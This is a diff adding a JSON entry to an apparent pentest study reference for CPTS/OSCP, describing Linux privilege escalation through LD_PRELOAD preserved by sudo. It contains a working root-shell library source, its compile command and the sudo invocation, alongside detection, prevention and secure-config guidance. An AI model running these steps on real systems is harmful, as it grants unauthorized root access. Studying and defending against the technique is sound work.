@@ -1,0 +1,101 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "gcc",
+    "sudo"
+  ],
+  "tags": [
+    "ld-preload",
+    "shared-library",
+    "sudo"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Shared Libraries",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Malicious _init() library source",
+      "command": "void _init(){ unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/bash\"); }"
+    },
+    {
+      "label": "Confirm libc/linker before building the .so",
+      "command": "ldd /bin/ls\ngetconf GNU_LIBC_VERSION"
+    }
+  ],
+  "notes": "Requires env_keep+=LD_PRELOAD in sudo -l. The malicious library's _init() runs before the target binary's main(), so it drops a root shell the instant the sudo command loads it.",
+  "references": [
+    {
+      "title": "All about LD_PRELOAD",
+      "url": "https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html"
+    },
+    {
+      "title": "GTFOBins - apache2",
+      "url": "https://gtfobins.github.io/#apache"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sudo-abuse",
+      "note": "Surfaces the env_keep+=LD_PRELOAD entry.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "ld-preload",
+  "name": "Shared Libraries - LD_PRELOAD via sudo",
+  "command": "sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart",
+  "description": "If sudoers has env_keep+=LD_PRELOAD, a command you may run with sudo will load your malicious shared library first - whose _init() spawns a root shell.",
+  "steps": [
+    {
+      "label": "1. Confirm LD_PRELOAD is kept",
+      "command": "sudo -l   # look for env_keep+=LD_PRELOAD"
+    },
+    {
+      "label": "2. Compile the malicious .so",
+      "command": "gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles"
+    },
+    {
+      "label": "3. Run an allowed sudo command with LD_PRELOAD",
+      "command": "sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1574.006"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "The LD_PRELOAD environment variable causes the dynamic linker to load a specified shared library before all others. If sudo preserves LD_PRELOAD (env_keep+=LD_PRELOAD in sudoers), running any sudo command loads the attacker's library first. A constructor function (_init) in the malicious library calls setuid(0)/setgid(0) and executes /bin/bash before the real command runs.",
+    "prerequisites": "sudo privileges for at least one command. sudoers has 'env_keep+=LD_PRELOAD' (misconfiguration). Ability to compile a shared library.",
+    "impact": "Root shell achieved by prepending a malicious shared library to any sudo command. The _init constructor runs with root privileges before the actual command, dropping a root shell.",
+    "detection": "sudo command executed with LD_PRELOAD environment variable set. Unusual .so file loaded by sudo process. Auditd: execve with LD_PRELOAD in environment by non-root before sudo. EDR: root shell spawned from sudo with unexpected library.",
+    "artifacts": "Auditd: sudo execution with LD_PRELOAD in environment | Process log: /bin/bash spawned from sudo with root uid | Malicious .so file in /tmp",
+    "prevention": "Remove 'env_keep+=LD_PRELOAD' from /etc/sudoers. The default sudoers should NOT preserve LD_PRELOAD (it is stripped by sudo by default). Audit sudoers regularly for env_keep entries. Use 'Defaults env_reset' to clear all environment variables in sudo sessions.",
+    "misconfiguration": "sudoers file contains 'Defaults env_keep+=LD_PRELOAD', allowing users to preserve this dangerous variable when running sudo commands.",
+    "vulnerable_config": "# Vulnerable sudoers\nDefaults env_keep+=LD_PRELOAD\n\n# Attack: any sudo command can be abused\nsudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart",
+    "secure_config": "# Secure sudoers -- reset environment (default)\nDefaults env_reset\n# Do NOT add env_keep+=LD_PRELOAD\n\n# Verify no env_keep entries for dangerous vars:\nsudo cat /etc/sudoers | grep env_keep",
+    "evasion": "The _init constructor runs before main() and before any argument processing -- the sudo command appears normal in logs but the library runs first.",
+    "sources": [
+      "HTB M25",
+      "MITRE T1574.006",
+      "MITRE T1548.003"
+    ]
+  }
+}
